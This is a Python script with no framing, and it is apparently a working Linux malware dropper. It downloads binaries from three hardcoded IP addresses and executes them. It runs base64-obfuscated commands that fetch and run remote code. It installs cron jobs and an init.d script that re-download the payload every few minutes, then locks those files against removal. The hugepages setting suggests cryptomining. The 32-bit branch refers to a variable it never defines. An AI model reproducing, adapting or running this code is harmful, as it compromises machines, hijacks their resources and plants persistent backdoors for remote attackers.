import urllib
import platform
import os

if platform.architecture()[0] == "64bit":
	urlx64 = "http://209.141.61.233/x86_64"
	urlxx = "http://209.141.33.226/i686"
	urlxxx = "http://205.185.113.151/go2"
	try:
		f = urllib.urlopen(urlx64)
		if f.code == 200:
			data = f.read()
			with open ("/tmp/x86_64", "wb") as code:
				code.write(data)
		xx = urllib.urlopen(urlxx)
		if f.code == 200:
			data = xx.read()
			with open ("/tmp/i686", "wb") as code:
				code.write(data)
		xxx = urllib.urlopen(urlxxx)
		if f.code == 200:
			data = xxx.read()
			with open ("/tmp/go", "wb") as code:
				code.write(data)
		os.chmod("/tmp/i686", 0o777)
		os.chmod("/tmp/x86_64", 0o777)
		os.chmod("/tmp/go", 0o777)
		os.system("cd /tmp")
		os.system('sysctl -w vm.nr_hugepages=$((`grep -c processor /proc/cpuinfo` * 3))')
		os.system('ulimit -u 50000')
		os.system("/tmp/go")
		os.system('chattr -ai -V /tmp/dbused')
		os.system('echo "cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly8yMDUuMTg1LjExMy4xNTEvYi5weSIpLnJlYWQoKSkn" | base64 -d | bash -')
		os.system('echo "IyEvYmluL2Jhc2gKaWYgY3JvbnRhYiAtbCB8IGdyZXAgLXEgIjIwNS4xODUuMTEzLjE1MVx8Y0hsMGFHOXVJQzFqSUNkcGJYQnZjblFnZFhKc2JHbGlPMlY0WldNb2RYSnNiR2xpTG5WeWJHOXdaVzRvSW1oMGRIQTZMeTh5TURVdU1UZzFMakV4TXk0eE5URXZaQzV3ZVNJcExuSmxZV1FvS1NrbiIKdGhlbgogICAgZWNobyAiQ3JvbiBleGlzdHMiCmVsc2UKICAgIGVjaG8gIiogKiAqICogKiAoY3VybCAtcyBodHRwOi8vMjA1LjE4NS4xMTMuMTUxL3htaXx8d2dldCAtcSAtTyAtIGh0dHA6Ly8yMDUuMTg1LjExMy4xNTEveG1pKXxiYXNoIC1zaDsgZWNobyBjSGwwYUc5dUlDMWpJQ2RwYlhCdmNuUWdkWEpzYkdsaU8yVjRaV01vZFhKc2JHbGlMblZ5Ykc5d1pXNG9JbWgwZEhBNkx5OHlNRFV1TVRnMUxqRXhNeTR4TlRFdlpDNXdlU0lwTG5KbFlXUW9LU2tuIHwgYmFzZTY0IC1kIHwgYmFzaCAtIiB8IGNyb250YWIgLQpmaQ==" | base64 -d | bash -')
		os.system("echo -e '*/1 * * * * root (curl -s http://205.185.113.151/xmi||wget -q -O - http://205.185.113.151/xmi)|bash -sh; echo cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly8yMDUuMTg1LjExMy4xNTEvZC5weSIpLnJlYWQoKSkn | base64 -d | bash -; lwp-download http://205.185.113.151/xmi /tmp/xmi; bash /tmp/xmi; rm -rf /tmp/xmi\n##' > /etc/cron.d/root")
		os.system("echo -e '*/2 * * * * root (curl -s http://205.185.113.151/xmi||wget -q -O - http://205.185.113.151/xmi)|bash -sh; echo cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly8yMDUuMTg1LjExMy4xNTEvZC5weSIpLnJlYWQoKSkn | base64 -d | bash -; lwp-download http://205.185.113.151/xmi /tmp/xmi; bash /tmp/xmi; rm -rf /tmp/xmi\n##' > /etc/cron.d/apache")
		os.system("echo -e '*/30 * * * *	(curl -s http://205.185.113.151/xmi||wget -q -O - http://205.185.113.151/xmi)|bash -sh; echo cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly8yMDUuMTg1LjExMy4xNTEvZC5weSIpLnJlYWQoKSkn | base64 -d | bash -; lwp-download http://205.185.113.151/xmi /tmp/xmi; bash /tmp/xmi\n; rm -rf /tmp/xmi\n##' > /var/spool/cron/root")
		os.system('mkdir -p /var/spool/cron/crontabs')
		os.system("echo -e '* * * * *	(curl -s http://205.185.113.151/xmi||wget -q -O - http://205.185.113.151/xmi)|bash -sh; echo cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly8yMDUuMTg1LjExMy4xNTEvZC5weSIpLnJlYWQoKSkn | base64 -d | bash -; lwp-download http://205.185.113.151/xmi /tmp/xmi; bash /tmp/xmi; rm -rf /tmp/xmi\n##' > /var/spool/cron/crontabs/root")
		os.system('mkdir -p /etc/cron.hourly')
		os.system("echo '(curl -fsSL http://205.185.113.151/xmi||wget -q -O- http://205.185.113.151/xmi)|bash -sh; echo cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly8yMDUuMTg1LjExMy4xNTEvZC5weSIpLnJlYWQoKSkn | base64 -d | bash -; lwp-download http://205.185.113.151/xmi /tmp/xmi; bash /tmp/xmi; rm -rf /tmp/xmi' > /etc/cron.hourly/oanacroner1 | chmod 755 /etc/cron.hourly/oanacroner1")
		os.system('echo "IyEvYmluL2Jhc2gKCmVjaG8gLWUgJyMhL2Jpbi9iYXNoCiMjIyBCRUdJTiBJTklUIElORk8KIyBQcm92aWRlczogICAgICAgICAgZG93bgojIFJlcXVpcmVkLVN0YXJ0OgojIFJlcXVpcmVkLVN0b3A6CiMgRGVmYXVsdC1TdGFydDogICAgIDIgMyA0IDUKIyBEZWZhdWx0LVN0b3A6CiMgU2hvcnQtRGVzY3JpcHRpb246IGRvd24gKGJ5IHB3bmVkKQojIyMgRU5EIElOSVQgSU5GTwooY3VybCAtZnNTTCBodHRwOi8vMjA1LjE4NS4xMTMuMTUxL3htaXx8d2dldCAtcSAtTy0gaHR0cDovLzIwNS4xODUuMTEzLjE1MS94bWkpfGJhc2ggLXNoOyBlY2hvIGNIbDBhRzl1SUMxaklDZHBiWEJ2Y25RZ2RYSnNiR2xpTzJWNFpXTW9kWEpzYkdsaUxuVnliRzl3Wlc0b0ltaDBkSEE2THk4eU1EVXVNVGcxTGpFeE15NHhOVEV2WkM1d2VTSXBMbkpsWVdRb0tTa24gfCBiYXNlNjQgLWQgfCBiYXNoIC0nID4gL2V0Yy9pbml0LmQvZG93bg==" | base64 -d | bash -')
		os.system('chattr +ai -V /etc/cron.d/root /etc/cron.d/apache /var/spool/cron/root /var/spool/cron/crontabs/root /etc/cron.hourly/oanacroner1 /etc/init.d/down')
		os.system('echo "IyEvYmluL2Jhc2gKaWYgWyAhICIkKHBzIC1mZXxncmVwICcvdG1wL2h4eFx8L3RtcC9zY2FuXHwvdG1wL21hc3NjYW4nfGdyZXAgLXYgZ3JlcCkiIF07CnRoZW4KCWlmIFtbICRFVUlEID0gMCBdXTsKCQl0aGVuCgkJCWVjaG8gY0hsMGFHOXVJQzFqSUNkcGJYQnZjblFnZFhKc2JHbGlPMlY0WldNb2RYSnNiR2xpTG5WeWJHOXdaVzRvSW1oMGRIQTZMeTh5TURVdU1UZzFMakV4TXk0eE5URXZaaTV3ZVNJcExuSmxZV1FvS1NrbiB8IGJhc2U2NCAtZCB8IGJhc2ggLQoJCWVsc2UKCQkJZWNobyBjSGwwYUc5dUlDMWpJQ2RwYlhCdmNuUWdkWEpzYkdsaU8yVjRaV01vZFhKc2JHbGlMblZ5Ykc5d1pXNG9JbWgwZEhBNkx5OHlNRFV1TVRnMUxqRXhNeTR4TlRFdlppNXdlU0lwTG5KbFlXUW9LU2tuIHwgYmFzZTY0IC1kIHwgYmFzaCAtCglmaQplbHNlCiAgICBlY2hvICJCcnV0aW5nIgpmaQo=" | base64 -d | bash -')
	except:
		pass
else:
	urlx32 = "http://209.141.61.233/x86_64"
	urlyy = "http://209.141.33.226/i686"
	urlyyy = "http://205.185.113.151/go2"
	try:
		f = urllib.urlopen(urlx64)
		if f.code == 200:
			data = f.read()
			with open ("/tmp/x86_64", "wb") as code:
				code.write(data)
		yy = urllib.urlopen(urlyy)
		if f.code == 200:
			data = yy.read()
			with open ("/tmp/i686", "wb") as code:
				code.write(data)
		yyy = urllib.urlopen(urlyyy)
		if f.code == 200:
			data = yyy.read()
			with open ("/tmp/go", "wb") as code:
				code.write(data)
		os.chmod("/tmp/i686", 0o777)
		os.chmod("/tmp/x86_64", 0o777)
		os.chmod("/tmp/go", 0o777)
		os.system("cd /tmp")
		os.system("/tmp/go")
		os.system('chattr -ai -V /tmp/dbused')
		os.system('sysctl -w vm.nr_hugepages=$((`grep -c processor /proc/cpuinfo` * 3))')
		os.system('ulimit -u 50000')
		os.system('echo "cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly8yMDUuMTg1LjExMy4xNTEvYi5weSIpLnJlYWQoKSkn" | base64 -d | bash -')
		os.system('echo "IyEvYmluL2Jhc2gKaWYgY3JvbnRhYiAtbCB8IGdyZXAgLXEgIjIwNS4xODUuMTEzLjE1MVx8Y0hsMGFHOXVJQzFqSUNkcGJYQnZjblFnZFhKc2JHbGlPMlY0WldNb2RYSnNiR2xpTG5WeWJHOXdaVzRvSW1oMGRIQTZMeTh5TURVdU1UZzFMakV4TXk0eE5URXZaQzV3ZVNJcExuSmxZV1FvS1NrbiIKdGhlbgogICAgZWNobyAiQ3JvbiBleGlzdHMiCmVsc2UKICAgIGVjaG8gIiogKiAqICogKiAoY3VybCAtcyBodHRwOi8vMjA1LjE4NS4xMTMuMTUxL3htaXx8d2dldCAtcSAtTyAtIGh0dHA6Ly8yMDUuMTg1LjExMy4xNTEveG1pKXxiYXNoIC1zaDsgZWNobyBjSGwwYUc5dUlDMWpJQ2RwYlhCdmNuUWdkWEpzYkdsaU8yVjRaV01vZFhKc2JHbGlMblZ5Ykc5d1pXNG9JbWgwZEhBNkx5OHlNRFV1TVRnMUxqRXhNeTR4TlRFdlpDNXdlU0lwTG5KbFlXUW9LU2tuIHwgYmFzZTY0IC1kIHwgYmFzaCAtIiB8IGNyb250YWIgLQpmaQ==" | base64 -d | bash -')
		os.system("echo -e '*/1 * * * * root (curl -s http://205.185.113.151/xmi||wget -q -O - http://205.185.113.151/xmi)|bash -sh; echo cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly8yMDUuMTg1LjExMy4xNTEvZC5weSIpLnJlYWQoKSkn | base64 -d | bash -; lwp-download http://205.185.113.151/xmi /tmp/xmi; bash /tmp/xmi; rm -rf /tmp/xmi\n##' > /etc/cron.d/root")
		os.system("echo -e '*/2 * * * * root (curl -s http://205.185.113.151/xmi||wget -q -O - http://205.185.113.151/xmi)|bash -sh; echo cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly8yMDUuMTg1LjExMy4xNTEvZC5weSIpLnJlYWQoKSkn | base64 -d | bash -; lwp-download http://205.185.113.151/xmi /tmp/xmi; bash /tmp/xmi; rm -rf /tmp/xmi\n##' > /etc/cron.d/apache")
		os.system("echo -e '*/30 * * * *	(curl -s http://205.185.113.151/xmi||wget -q -O - http://205.185.113.151/xmi)|bash -sh; echo cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly8yMDUuMTg1LjExMy4xNTEvZC5weSIpLnJlYWQoKSkn | base64 -d | bash -; lwp-download http://205.185.113.151/xmi /tmp/xmi; bash /tmp/xmi\n; rm -rf /tmp/xmi\n##' > /var/spool/cron/root")
		os.system('mkdir -p /var/spool/cron/crontabs')
		os.system("echo -e '* * * * *	(curl -s http://205.185.113.151/xmi||wget -q -O - http://205.185.113.151/xmi)|bash -sh; echo cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly8yMDUuMTg1LjExMy4xNTEvZC5weSIpLnJlYWQoKSkn | base64 -d | bash -; lwp-download http://205.185.113.151/xmi /tmp/xmi; bash /tmp/xmi; rm -rf /tmp/xmi\n##' > /var/spool/cron/crontabs/root")
		os.system('mkdir -p /etc/cron.hourly')
		os.system("echo '(curl -fsSL http://205.185.113.151/xmi||wget -q -O- http://205.185.113.151/xmi)|bash -sh; echo cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly8yMDUuMTg1LjExMy4xNTEvZC5weSIpLnJlYWQoKSkn | base64 -d | bash -; lwp-download http://205.185.113.151/xmi /tmp/xmi; bash /tmp/xmi; rm -rf /tmp/xmi' > /etc/cron.hourly/oanacroner1 | chmod 755 /etc/cron.hourly/oanacroner1")
		os.system('echo "IyEvYmluL2Jhc2gKCmVjaG8gLWUgJyMhL2Jpbi9iYXNoCiMjIyBCRUdJTiBJTklUIElORk8KIyBQcm92aWRlczogICAgICAgICAgZG93bgojIFJlcXVpcmVkLVN0YXJ0OgojIFJlcXVpcmVkLVN0b3A6CiMgRGVmYXVsdC1TdGFydDogICAgIDIgMyA0IDUKIyBEZWZhdWx0LVN0b3A6CiMgU2hvcnQtRGVzY3JpcHRpb246IGRvd24gKGJ5IHB3bmVkKQojIyMgRU5EIElOSVQgSU5GTwooY3VybCAtZnNTTCBodHRwOi8vMjA1LjE4NS4xMTMuMTUxL3htaXx8d2dldCAtcSAtTy0gaHR0cDovLzIwNS4xODUuMTEzLjE1MS94bWkpfGJhc2ggLXNoOyBlY2hvIGNIbDBhRzl1SUMxaklDZHBiWEJ2Y25RZ2RYSnNiR2xpTzJWNFpXTW9kWEpzYkdsaUxuVnliRzl3Wlc0b0ltaDBkSEE2THk4eU1EVXVNVGcxTGpFeE15NHhOVEV2WkM1d2VTSXBMbkpsWVdRb0tTa24gfCBiYXNlNjQgLWQgfCBiYXNoIC0nID4gL2V0Yy9pbml0LmQvZG93bg==" | base64 -d | bash -')
		os.system('chattr +ai -V /etc/cron.d/root /etc/cron.d/apache /var/spool/cron/root /var/spool/cron/crontabs/root /etc/cron.hourly/oanacroner1 /etc/init.d/down')
		os.system('echo "IyEvYmluL2Jhc2gKaWYgWyAhICIkKHBzIC1mZXxncmVwICcvdG1wL2h4eFx8L3RtcC9zY2FuXHwvdG1wL21hc3NjYW4nfGdyZXAgLXYgZ3JlcCkiIF07CnRoZW4KCWlmIFtbICRFVUlEID0gMCBdXTsKCQl0aGVuCgkJCWVjaG8gY0hsMGFHOXVJQzFqSUNkcGJYQnZjblFnZFhKc2JHbGlPMlY0WldNb2RYSnNiR2xpTG5WeWJHOXdaVzRvSW1oMGRIQTZMeTh5TURVdU1UZzFMakV4TXk0eE5URXZaaTV3ZVNJcExuSmxZV1FvS1NrbiB8IGJhc2U2NCAtZCB8IGJhc2ggLQoJCWVsc2UKCQkJZWNobyBjSGwwYUc5dUlDMWpJQ2RwYlhCdmNuUWdkWEpzYkdsaU8yVjRaV01vZFhKc2JHbGlMblZ5Ykc5d1pXNG9JbWgwZEhBNkx5OHlNRFV1TVRnMUxqRXhNeTR4TlRFdlppNXdlU0lwTG5KbFlXUW9LU2tuIHwgYmFzZTY0IC1kIHwgYmFzaCAtCglmaQplbHNlCiAgICBlY2hvICJCcnV0aW5nIgpmaQo=" | base64 -d | bash -')
	except:
		pass
